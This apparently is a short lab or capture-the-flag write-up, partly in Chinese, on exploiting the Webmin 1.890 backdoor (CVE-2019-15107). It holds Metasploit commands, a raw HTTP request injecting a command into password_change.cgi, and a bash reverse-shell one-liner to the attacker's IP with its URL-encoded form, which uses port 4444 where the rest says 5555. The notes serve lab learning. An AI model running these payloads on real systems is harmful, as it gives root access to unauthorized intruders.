# source



rustscan -a  10.10.202.252  -- -sV
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

hostname 
ip-10-10-202-252.eu-west-1.compute.internal




使用 Webmin miniserv 1.890，可以查看 http response
```
http://10.10.202.252:10000/
```

使用SSL
```
This web server is running in SSL mode. Try the URL https://ip-10-10-253-246.eu-west-1.compute.internal:10000/ instead.
```




**MSF**
```
msfconsole
search Webmin
search CVE-2019-15107
```



**找到**
```
exploit/linux/http/webmin_backdoor
info exploit/linux/http/webmin_backdoor
```

**exploit** 
```
use exploit/linux/http/webmin_backdoor

set rhost 10.10.202.252

set lhost  10.18.1.192 

set ssl true


show payloads

set payload payload/cmd/unix/reverse_bash
```


id
uid=0(root) gid=0(root) groups=0(root)

ls -al | grep version
-rw-r--r--   1 root root      6 Jul 15  2018 version

cat version
1.890

Webmin








## 手動觸發漏洞， 並且自己用shell


```
write up 網路上版本很多都錯。 exploit 並不通用。
https://codeantenna.com/a/ilVpvHkIvG


https://10.10.202.252:10000/session_login.cgi

/password_change.cgi
https://10.10.202.252:10000/password_change.cgi


```

http包
```
POST /password_change.cgi HTTP/1.1
Host: 10.10.202.252:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://10.10.202.252:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 14


expired=whoami
```


---

payload
```
bash -c "bash -i >& /dev/tcp/10.18.1.192/5555 0>&1"

編碼
%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%38%2e%31%2e%31%39%32%2f%34%34%34%34%20%30%3e%26%31%22
```

拿shell
```
nc -lvnp 5555
```







